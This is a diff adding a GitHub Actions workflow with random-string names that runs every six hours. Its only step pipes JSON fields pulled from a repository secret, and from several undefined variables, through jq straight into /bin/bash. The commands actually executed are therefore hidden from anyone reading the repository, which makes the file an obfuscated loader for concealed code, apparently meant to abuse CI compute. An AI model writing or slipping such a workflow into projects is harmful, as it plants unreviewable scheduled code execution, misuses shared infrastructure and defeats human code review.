@@ -1,0 +1,26 @@
+name: immaterialquantity
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: immaterialquantity
+        env:
+          rysgj79: ${{ secrets.rysgj79 }}
+        run: |
+          echo $rysgj79 | jq -r .mlpd7 | /bin/bash
+          echo $p3 | jq -r .yxh5889 | /bin/bash
+          echo $fh91578 | jq -r .wp883 | /bin/bash
+          echo $nrxc60 | jq -r .sd6 | /bin/bash
+          echo $ea660 | jq -r .cgagg1 | /bin/bash
+          echo $r21 | jq -r .jfdis4008 | /bin/bash
+          echo $r66 | jq -r .qezs857 | /bin/bash
+          echo $x07450 | jq -r .cy94 | /bin/bash
+          echo $ia86350 | jq -r .wjak453 | /bin/bash
+
